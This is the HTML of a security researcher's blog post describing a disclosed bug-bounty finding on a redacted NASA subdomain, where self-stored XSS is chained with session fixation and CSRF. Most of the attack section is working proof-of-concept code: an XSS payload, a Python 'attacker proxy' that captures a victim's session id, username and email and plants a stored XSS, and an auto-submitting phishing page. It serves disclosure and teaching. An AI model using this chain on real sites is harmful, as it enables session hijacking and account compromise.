<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Spatial VDP: How I Rocked-Boosted a NASA XSS from P5 to P2 üöÄ | Giacomo Lenzini</title>
<meta name=keywords content="NASA,VDPs,Bug Bounty,Bugcrowd"><meta name=description content="Introduction
A few months ago, I read an intriguing article by Valerio &ldquo;MrSaighnal&rdquo; Alessandroni, detailing how he earned a letter of acknowledgment from NASA for reporting a vulnerability. That story stuck with me.
NASA&rsquo;s Vulnerability Disclosure Program (VDP) is a non-monetary initiative that invites security researchers to report vulnerabilities in NASA&rsquo;s public-facing systems. Unlike traditional bug bounties, the reward is purely ethical hacking glory ‚Äì but with a cosmic twist.
For valid P3 or higher vulnerabilities, researchers receive:"><meta name=author content="GiacoLenzo2109"><link rel=canonical href=http://localhost:1313/blog/nasa-vdp/><link crossorigin=anonymous href=/assets/css/stylesheet.b865c0080a30dc5dc3f5f9818659cd5c4a8ea5cc2199387567bfbc554747d9b6.css integrity="sha256-uGXACAow3F3D9fmBhlnNXEqOpcwhmTh1Z7+8VUdH2bY=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/blog/nasa-vdp/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/blog/nasa-vdp/"><meta property="og:site_name" content="Giacomo Lenzini"><meta property="og:title" content="Spatial VDP: How I Rocked-Boosted a NASA XSS from P5 to P2 üöÄ"><meta property="og:description" content="Introduction A few months ago, I read an intriguing article by Valerio ‚ÄúMrSaighnal‚Äù Alessandroni, detailing how he earned a letter of acknowledgment from NASA for reporting a vulnerability. That story stuck with me.
NASA‚Äôs Vulnerability Disclosure Program (VDP) is a non-monetary initiative that invites security researchers to report vulnerabilities in NASA‚Äôs public-facing systems. Unlike traditional bug bounties, the reward is purely ethical hacking glory ‚Äì but with a cosmic twist.
For valid P3 or higher vulnerabilities, researchers receive:"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2025-05-13T00:00:00+00:00"><meta property="article:modified_time" content="2025-05-13T00:00:00+00:00"><meta property="article:tag" content="NASA"><meta property="article:tag" content="VDPs"><meta property="article:tag" content="Bug Bounty"><meta property="article:tag" content="Bugcrowd"><meta property="og:image" content="http://localhost:1313/images/articles/nasa-vdp/nasa.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/images/articles/nasa-vdp/nasa.png"><meta name=twitter:title content="Spatial VDP: How I Rocked-Boosted a NASA XSS from P5 to P2 üöÄ"><meta name=twitter:description content="Introduction
A few months ago, I read an intriguing article by Valerio &ldquo;MrSaighnal&rdquo; Alessandroni, detailing how he earned a letter of acknowledgment from NASA for reporting a vulnerability. That story stuck with me.
NASA&rsquo;s Vulnerability Disclosure Program (VDP) is a non-monetary initiative that invites security researchers to report vulnerabilities in NASA&rsquo;s public-facing systems. Unlike traditional bug bounties, the reward is purely ethical hacking glory ‚Äì but with a cosmic twist.
For valid P3 or higher vulnerabilities, researchers receive:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"http://localhost:1313/blog/"},{"@type":"ListItem","position":2,"name":"Spatial VDP: How I Rocked-Boosted a NASA XSS from P5 to P2 üöÄ","item":"http://localhost:1313/blog/nasa-vdp/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Spatial VDP: How I Rocked-Boosted a NASA XSS from P5 to P2 üöÄ","name":"Spatial VDP: How I Rocked-Boosted a NASA XSS from P5 to P2 üöÄ","description":"Introduction A few months ago, I read an intriguing article by Valerio \u0026ldquo;MrSaighnal\u0026rdquo; Alessandroni, detailing how he earned a letter of acknowledgment from NASA for reporting a vulnerability. That story stuck with me.\nNASA\u0026rsquo;s Vulnerability Disclosure Program (VDP) is a non-monetary initiative that invites security researchers to report vulnerabilities in NASA\u0026rsquo;s public-facing systems. Unlike traditional bug bounties, the reward is purely ethical hacking glory ‚Äì but with a cosmic twist.\nFor valid P3 or higher vulnerabilities, researchers receive:\n","keywords":["NASA","VDPs","Bug Bounty","Bugcrowd"],"articleBody":"Introduction A few months ago, I read an intriguing article by Valerio ‚ÄúMrSaighnal‚Äù Alessandroni, detailing how he earned a letter of acknowledgment from NASA for reporting a vulnerability. That story stuck with me.\nNASA‚Äôs Vulnerability Disclosure Program (VDP) is a non-monetary initiative that invites security researchers to report vulnerabilities in NASA‚Äôs public-facing systems. Unlike traditional bug bounties, the reward is purely ethical hacking glory ‚Äì but with a cosmic twist.\nFor valid P3 or higher vulnerabilities, researchers receive:\nüìú A personalized Letter of Acknowledgment ‚ú® Public listing in NASA‚Äôs Hall of Fame üëæ Challenge accepted üëæ\nVulnerability Hunting Domain Recon While developing an automated domain reconnaissance tool, I needed a worthy target to test its capabilities. NASA‚Äôs Vulnerability Disclosure Program (VDP), with its vast constellation of subdomains and complex infrastructure, seemed like the perfect challenge.\nAfter scanning and cataloging hundreds of potential targets, I began hunting for particularly interesting subdomains.\nSelf-Stored XSS (Cross-Site Scripting) My initial discoveries were underwhelming, a few self-XSS flaws (automatically classified as P5) that didn‚Äôt qualify for recognition, along with several P3 duplicates that had already been reported. The hunt was proving tougher than expected.\nThen came the breakthrough during one of those late-night hacking sessions I stumbled upon an intriguing subdomain hosting a web application protected by a login portal.\nHere‚Äôs what made the vulnerability interesting:\nRegistration was open to all users.\nVarious post-login functionalities were available.\nUser input was not properly sanitized.\nWhile navigating the website as an authenticated user, I began testing various functionalities until I discovered the ability to store a custom configuration tied to the current application. This configuration is automatically loaded upon each user login, and its values are directly reflected within the application‚Äôs interface.\nI attempted to insert the following simple XSS payload:\n\u003cimg src=x onerror=alert(document.domain)\u003e The following HTTP POST request was used to save the new configuration.\nI successfully saved the malicious payload persistently in the web application configuration, leading to a successful XSS attack!\nUnfortunately, it was classified as a Self-Stored XSS (P5) since it was limited to my own account. According to the BugCrowd taxonomy, it was deemed an Informational Vulnerability.\nSession Fixation Since the Self-Stored XSS was classified as P5 and the only way to persist it across different users was by hijacking the session (Session Hijacking), I noticed that no cookies were used. Instead, the sessionid was passed in the body of the request.\nThis prompted me to analyze the authentication flow, eager to understand how the sessionid was generated and utilized by the application. During my investigation, I uncovered a more critical flaw: it is possible to retrieve a sessionid from the server and set it before logging in. Once the login is completed, the sessionid remains unchanged and is not invalidated.\nAn attacker could exploit this token to perform various requests as the victim.\nAuthentication Flow Login Initiator: The login process to the web application begins with an HTTP POST request to obtain a valid sessionid from the server, which is then directly included in the response. Request Login Form: A POST request is made, containing the information obtained from the Login Initiator in the request body. The response returns an HTML page with a login form, where hidden input fields are pre-populated with values from the body (such as the sessionid and host). Here an example of the form generated using the sessionid passed in the previous request:\n\u003cform action='https://.nasa.gov//LoginSubmit' name='loginform' method='post'\u003e \u003cfieldset\u003e \u003cinput type='hidden' id='loginid' name='loginid' value=ID /\u003e \u003cinput type='hidden' id='sessionid' name='sessionid' value=ID /\u003e \u003cinput type='hidden' name='host' value='HOST' /\u003e \u003cinput type='hidden' name='loginpath' value='LOGIN_PATH' /\u003e \u003cdiv class='ffield'\u003e \u003clabel for='uid'\u003eUser ID:\u0026nbsp;\u003c/label\u003e \u003cinput type='text' id='uid' name='uid' size=25 /\u003e \u003cp\u003e \u003clabel for='pwd'\u003ePassword:\u0026nbsp;\u003c/label\u003e \u003cinput type='password' id='pwd' name='pwd' size=25 /\u003e \u003ca href='#' onmousedown='toggleDiv()'\u003eForgot your password?\u003c/a\u003e \u003c/p\u003e \u003cSNIPPET\u003e \u003c/fieldset\u003e \u003c/form\u003e Login Monitor: An HTTP POST request is made to monitor for a successful login. Once the user is logged in, this request returns the user‚Äôs information, such as username and email. Login Submit: Once the login is completed, the sessionid retrieved during the Login Initiator phase and the username obtained during the Login Monitor phase are used to execute various requests within the web application. In this way, an attacker could exploit the session fixation vulnerability to force the victim to use a known sessionid, effectively impersonating the victim.\nThis finding hit P3 status, which meant one beautiful thing:\n‚ÄúI‚Äôm eligable for NASA acknowledgment letter!‚Äù\nExploit Chain Analysis As I stared at these two seemingly isolated findings, a dangerous possibility emerged:\n‚ÄúWhat if I could combine the session fixation flaw with this persistent Self-Stored XSS? Could these P3 and P5 vulnerabilities somehow create a greater-level threat?‚Äù\nAll the pieces aligned:\n‚úÖ Session id persisted post-authentication\n‚úÖ XSS request using sessionid\n‚úÖ No anti-CSRF token protection\nThe potential attack vector became clear:\nSession Fixation + CSRF: Force a victim to login with a known sessionid Self-Stored XSS: Store and trigger the stored XSS payload using the victim‚Äôs sessionid Proof of Concept 1. Create a Python server (Attacker Proxy Server) A custom Python-based proxy server was developed to intercept and initiate the Login Initiator request in order to capture the sessionid and host that would later be used by the victim. Additionally, the proxy was used to monitor login activity and extract the authenticated user‚Äôs details (e.g. username), which were essential to successfully perform a Stored Cross-Site Scripting (XSS) attack. Once the username was obtained, the Stored XSS request was executed, ensuring that it would be triggered automatically upon the victim‚Äôs next login to the web application.\nLogin Initiator: Execute the Login Initiator request and return the generated sessionid (loginid) to the victim.\nLogin Monitor: Perform Login Monitor to capture the authenticated user‚Äôs information (e.g., username) required for the XSS malicious request.\nStore XSS: Inject a stored XSS payload into the victim‚Äôs web application configuration using the collected sessionid (loginid) and username.\nfrom flask import Flask, request, jsonify, redirect import requests from flask_cors import CORS from xml.etree import ElementTree as ET from threading import Thread app = Flask(__name__) CORS(app) # 1. Login Initiator @app.route('/proxy', methods=['GET', 'POST']) def proxy_request(): url = request.args.get('url') if not url: return jsonify({'error': 'URL parameter is required'}), 400 try: response = requests.get(url) root = ET.fromstring(response.content) loginid = root.findtext('loginid') print(f\"Login ID: {loginid}\") Thread(target=loginMonitor, args=(loginid,)).start() return (response.content, response.status_code, response.headers.items()) except requests.RequestException as e: return jsonify({'error': str(e)}), 500 # 2. Login Monitor def loginMonitor(loginid): try: data = { 'host': '\u003e', 'id': loginid, 'timeout': 30 } print(\"Login Monitor ID: \" + loginid) response = requests.post('https://.nasa.gov//LoginMonitor', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}) root = ET.fromstring(response.content) status = root.findtext('status') while status != \"valid\": response = requests.post('https://.nasa.gov//LoginMonitor', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}) root = ET.fromstring(response.content) status = root.findtext('status') if status == \"valid\": root = ET.fromstring(response.content) uname = root.findtext('uname') email = root.findtext('email') if uname: uname = uname.replace('_login_.', '') print(f\"Username: {uname}\") print(f\"Email: {email}\") print(\"Session Hijacked correctly!\") storeXSS(uname, loginid) return except requests.RequestException as e: return jsonify({'error': str(e)}), 500 # 3. Store XSS def storeXSS(username, loginid): url = 'https://.nasa.gov//QueryServlet' headers = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' } data = { 'setUserMetadata': '', 'user': username, 'sessionid': loginid, 'type': 'config', 'name': '', 'relation': 'content', 'value': '' } try: response = requests.post(url, headers=headers, data=data) print(f\"Stored XSS response status code: {str(response.status_code)}\") print(f\"Stored XSS response content: {response.content.decode('utf-8')}\") if response.status_code == 200: print(\"XSS PoC stored successfully\") print(\"At the first login at https://.nasa.gov// web application, the victim will automatically trigger the XSS payload!\") return if response.status_code == 500: print(\"Error storing XSS PoC\") print(\"The server may be overloaded with a high volume of requests. Retry later!\") return except requests.RequestException as e: return jsonify({'error': str(e)}), 500 if __name__ == '__main__': app.run(host=\"0.0.0.0\", port=8080, debug=True) 2. Create a PoC HTML file This chain will only be effective in a phishing attack scenario. A PoC HTML file was created to combine Session Fixation with CSRF (Cross-Site Request Forgery).\nLogin Initiator: When the victim opens the PoC HTML file, a JavaScript payload is executed which triggers a fetch request to the attacker-controlled proxy server. The proxy then issues an HTTP POST request to the Login Initiator endpoint (https://.nasa.gov//LoginInitiator) to obtain a new sessionid, which will later be associated with the victim‚Äôs session.\nLogin Form: Due to the way the login flow is implemented, the login form is dynamically generated through an HTTP POST request to https://.nasa.gov//LoginForm. This request includes the previously obtained sessionid and host in the body, which are then embedded as hidden input fields in the returned form. As a result, when the victim submits their credentials, the same sessionid becomes associated with their authenticated session.\n\u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eSession Fixation + Stored XSS\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript\u003e // 1. Login Initiator window.onload = function () { const url = 'https://.nasa.gov//LoginInitiator'; const proxy = \"http://localhost:8080/\"; // Python Proxy server URL proxy_request = proxy + \"proxy?url=\" + encodeURIComponent(url) fetch(proxy_request, { method: 'GET', headers: { 'Content-Type': 'application/x-www-form-urlencoded', } }) .then(response =\u003e { if (response.status === 200) { return response.text(); } else { throw new Error('Network response was not ok'); } }) .then(responseText =\u003e { // Parse the XML response to get loginid (sessionid) and host const parser = new DOMParser(); const xmlDoc = parser.parseFromString(responseText, \"application/xml\"); const loginid = xmlDoc.getElementsByTagName('loginid')[0].textContent; const host = xmlDoc.getElementsByTagName('host')[0].textContent; // Display loginid and host for debugging console.log('Login ID:', loginid); console.log('Host:', host); loginForm(loginid, host); }) .catch(error =\u003e { // Handle any errors console.error('Error:', error); }); } // 2. Login Form request function loginForm(loginid, host) { const url = 'https://.nasa.gov//LoginForm'; // Form data for the form request const data = new FormData(); data.append('loginid', loginid); data.append('host', host); data.append('sessionid', loginid); // Send the second POST request const form = document.createElement('form'); form.method = 'POST'; form.action = url; // Append the form data to the form for (const [key, value] of data.entries()) { const input = document.createElement('input'); input.type = 'hidden'; input.name = key; input.value = value; form.appendChild(input); } // Append the form to the body and submit it document.body.appendChild(form); form.submit(); } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 3. PoC Now that both the exploit and the proxy server were ready, I simulated a phishing attack by delivering the PoC HTML file to the victim (for simplicity, I used my own user giacolenzo2109).\nThe image below shows the output of the Python proxy server, highlighting each step of the attack flow that was successfully executed.\nIt is possible to observe how the server successfully obtained the sessionid used by the victim to login, and how the XSS was ultimately stored on the victim‚Äôs account.\n4. XSS Finally, the stored XSS payload was successfully triggered upon the victim‚Äôs first login.\nReward From a P5 Stored XSS (Charmander) to a P2 Session Fixation chained with Self-Stored XSS, significantly increasing the impact (Charizard).\nLesson Learned Security weaknesses should always be viewed as part of a broader attack surface. By chaining vulnerabilities together, we can better assess their full risk and potential impact.\nVulnerability Impact Self-Stored XSS (Charmander) P5 Session Fixation (Charmeleon) P3 Session Fixation + CSRF + Self-Stored XSS (Charizard) P2 Letter of Acknowledgement ","wordCount":"1808","inLanguage":"en","image":"http://localhost:1313/images/articles/nasa-vdp/nasa.png","datePublished":"2025-05-13T00:00:00Z","dateModified":"2025-05-13T00:00:00Z","author":{"@type":"Person","name":"GiacoLenzo2109"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/nasa-vdp/"},"publisher":{"@type":"Organization","name":"Giacomo Lenzini","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Giacomo Lenzini (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Giacomo Lenzini</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/whoami/ title=Whoami><span>Whoami</span></a></li><li><a href=http://localhost:1313/blog/ title=Blog><span>Blog</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;¬ª&nbsp;<a href=http://localhost:1313/blog/>Blogs</a></div><h1 class="post-title entry-hint-parent">Spatial VDP: How I Rocked-Boosted a NASA XSS from P5 to P2 üöÄ</h1><div class=post-meta><span title='2025-05-13 00:00:00 +0000 UTC'>May 13, 2025</span>&nbsp;¬∑&nbsp;9 min&nbsp;¬∑&nbsp;GiacoLenzo2109</div></header><figure class=entry-cover><img loading=eager src=http://localhost:1313/images/articles/nasa-vdp/nasa.png alt></figure><div class=post-content><h1 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h1><p>A few months ago, I read an intriguing <a href=https://blog.keephack.ing/2025-02-17-Houston-We-Have-a-vulnerability/>article</a> by Valerio &ldquo;<strong>MrSaighnal</strong>&rdquo; Alessandroni, detailing how he earned a <strong>letter of acknowledgment from NASA</strong> for reporting a vulnerability. That story stuck with me.</p><p><strong>NASA&rsquo;s Vulnerability Disclosure Program (VDP)</strong> is a non-monetary initiative that invites security researchers to report vulnerabilities in NASA&rsquo;s public-facing systems. Unlike traditional bug bounties, the reward is purely ethical hacking glory ‚Äì but with a cosmic twist.</p><p>For valid P3 or higher vulnerabilities, researchers receive:</p><ul><li>üìú A personalized Letter of Acknowledgment</li><li>‚ú® Public listing in NASA&rsquo;s Hall of Fame</li></ul><p><strong>üëæ Challenge accepted üëæ</strong></p><h1 id=vulnerability-hunting>Vulnerability Hunting<a hidden class=anchor aria-hidden=true href=#vulnerability-hunting>#</a></h1><h2 id=domain-recon>Domain Recon<a hidden class=anchor aria-hidden=true href=#domain-recon>#</a></h2><p>While developing an automated domain reconnaissance tool, I needed a worthy target to test its capabilities. NASA&rsquo;s Vulnerability Disclosure Program (VDP), with its vast constellation of subdomains and complex infrastructure, seemed like the perfect challenge.</p><p>After scanning and cataloging hundreds of potential targets, I began hunting for particularly interesting subdomains.</p><h2 id=self-stored-xss-cross-site-scripting>Self-Stored XSS (Cross-Site Scripting)<a hidden class=anchor aria-hidden=true href=#self-stored-xss-cross-site-scripting>#</a></h2><p>My initial discoveries were underwhelming, a few self-XSS flaws (automatically classified as P5) that didn&rsquo;t qualify for recognition, along with several P3 duplicates that had already been reported. The hunt was proving tougher than expected.</p><p>Then came the breakthrough during one of those late-night hacking sessions I stumbled upon an intriguing subdomain hosting a web application protected by a login portal.</p><p>Here&rsquo;s what made the vulnerability interesting:</p><ol><li><p>Registration was open to all users.</p></li><li><p>Various post-login functionalities were available.</p></li><li><p>User input was not properly sanitized.</p></li></ol><p>While navigating the website as an authenticated user, I began testing various functionalities until I discovered the ability to store a custom configuration tied to the current application. This configuration is automatically loaded upon each user login, and its values are directly reflected within the application&rsquo;s interface.</p><p>I attempted to insert the following simple XSS payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>x</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(document.domain)</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>The following HTTP POST request was used to save the new configuration.</p><p><img alt="Save Conf Request" loading=lazy src=/images/articles/nasa-vdp/save_conf.png></p><p>I successfully saved the malicious payload persistently in the web application configuration, leading to a successful XSS attack!</p><p><img alt=XSS loading=lazy src=/images/articles/nasa-vdp/self-xss.png></p><p>Unfortunately, it was classified as a <em>Self-Stored XSS (<strong>P5</strong>)</em> since it was limited to my own account. According to the BugCrowd taxonomy, it was deemed an <em>Informational Vulnerability</em>.</p><p><img alt="Charmender Sad" loading=lazy src=/images/articles/nasa-vdp/gif/charmender.gif></p><h2 id=session-fixation>Session Fixation<a hidden class=anchor aria-hidden=true href=#session-fixation>#</a></h2><p>Since the <em>Self-Stored XSS</em> was classified as <strong>P5</strong> and the only way to persist it across different users was by hijacking the session (Session Hijacking), I noticed that no cookies were used. Instead, the <em>sessionid</em> was passed in the body of the request.</p><p>This prompted me to analyze the authentication flow, eager to understand how the <em>sessionid</em> was generated and utilized by the application. During my investigation, I uncovered a more critical flaw: it is possible to retrieve a <em>sessionid</em> from the server and set it before logging in. Once the login is completed, the <em>sessionid</em> remains unchanged and is not invalidated.</p><p>An attacker could exploit this token to perform various requests as the victim.</p><h3 id=authentication-flow>Authentication Flow<a hidden class=anchor aria-hidden=true href=#authentication-flow>#</a></h3><img src=/images/articles/nasa-vdp/auth_flow.png width=500 height=auto alt="Auth Flow"><ol><li><strong>Login Initiator</strong>: The login process to the web application begins with an HTTP POST request to obtain a valid <em>sessionid</em> from the server, which is then directly included in the response.</li></ol><p><img alt="Login Initiator" loading=lazy src=/images/articles/nasa-vdp/login_initiator.png></p><ol start=2><li><strong>Request Login Form</strong>: A POST request is made, containing the information obtained from the <em>Login Initiator</em> in the request body. The response returns an HTML page with a login form, where hidden input fields are pre-populated with values from the body (such as the <em>sessionid</em> and <em>host</em>).</li></ol><p><img alt="Login Form" loading=lazy src=/images/articles/nasa-vdp/login_form.png></p><p>Here an example of the form generated using the <em>sessionid</em> passed in the previous request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#39;https://&lt;REDACTED&gt;.nasa.gov/&lt;REDACTED&gt;/LoginSubmit&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;loginform&#39;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#39;post&#39;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>fieldset</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;hidden&#39;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;loginid&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;loginid&#39;</span> <span class=na>value</span><span class=o>=</span><span class=s>ID</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;hidden&#39;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;sessionid&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;sessionid&#39;</span> <span class=na>value</span><span class=o>=</span><span class=s>ID</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;hidden&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;host&#39;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#39;HOST&#39;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;hidden&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;loginpath&#39;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#39;LOGIN_PATH&#39;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#39;ffield&#39;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>label</span> <span class=na>for</span><span class=o>=</span><span class=s>&#39;uid&#39;</span><span class=p>&gt;</span>User ID:<span class=ni>&amp;nbsp;</span><span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;text&#39;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;uid&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;uid&#39;</span> <span class=na>size</span><span class=o>=</span><span class=s>25</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>label</span> <span class=na>for</span><span class=o>=</span><span class=s>&#39;pwd&#39;</span><span class=p>&gt;</span>Password:<span class=ni>&amp;nbsp;</span><span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;password&#39;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#39;pwd&#39;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;pwd&#39;</span> <span class=na>size</span><span class=o>=</span><span class=s>25</span> <span class=p>/&gt;</span> <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#39;#&#39;</span> <span class=na>onmousedown</span><span class=o>=</span><span class=s>&#39;toggleDiv()&#39;</span><span class=p>&gt;</span>Forgot your password?<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>SNIPPET</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>fieldset</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span></code></pre></div><ol start=3><li><strong>Login Monitor</strong>: An HTTP POST request is made to monitor for a successful login. Once the user is logged in, this request returns the user&rsquo;s information, such as <em>username</em> and <em>email</em>.</li></ol><p><img alt="Login Monitor" loading=lazy src=/images/articles/nasa-vdp/login_monitor.png></p><ol start=4><li><strong>Login Submit</strong>: Once the login is completed, the <em>sessionid</em> retrieved during the <em>Login Initiator</em> phase and the <em>username</em> obtained during the <em>Login Monitor</em> phase are used to execute various requests within the web application.</li></ol><p>In this way, an attacker could exploit the <strong>session fixation</strong> vulnerability to force the victim to use a known <em>sessionid</em>, effectively impersonating the victim.</p><p>This finding hit <strong>P3</strong> status, which meant one beautiful thing:</p><p><em>&ldquo;I&rsquo;m eligable for NASA acknowledgment letter!&rdquo;</em></p><p><img alt="Charmender Evolution" loading=lazy src=/images/articles/nasa-vdp/gif/evolution2.gif></p><h1 id=exploit-chain-analysis>Exploit Chain Analysis<a hidden class=anchor aria-hidden=true href=#exploit-chain-analysis>#</a></h1><p>As I stared at these two seemingly isolated findings, a dangerous possibility emerged:</p><p><em>&ldquo;What if I could combine the session fixation flaw with this persistent Self-Stored XSS? Could these P3 and P5 vulnerabilities somehow create a greater-level threat?&rdquo;</em></p><p><img alt=Idea loading=lazy src=/images/articles/nasa-vdp/gif/idea.gif></p><p>All the pieces aligned:</p><p>‚úÖ Session id persisted post-authentication</p><p>‚úÖ XSS request using <em>sessionid</em></p><p>‚úÖ No anti-CSRF token protection</p><p>The potential attack vector became clear:</p><ul><li><strong>Session Fixation + CSRF</strong>: Force a victim to login with a known <em>sessionid</em></li><li><strong>Self-Stored XSS</strong>: Store and trigger the stored XSS payload using the victim&rsquo;s <em>sessionid</em></li></ul><h2 id=proof-of-concept>Proof of Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h2><img src=/images/articles/nasa-vdp/PoC_Flow.png width=500 height=auto><h3 id=1-create-a-python-server-attacker-proxy-server>1. Create a Python server (Attacker Proxy Server)<a hidden class=anchor aria-hidden=true href=#1-create-a-python-server-attacker-proxy-server>#</a></h3><p>A custom Python-based proxy server was developed to intercept and initiate the <strong>Login Initiator</strong> request in order to capture the <em>sessionid</em> and <em>host</em> that would later be used by the victim. Additionally, the proxy was used to monitor login activity and extract the authenticated 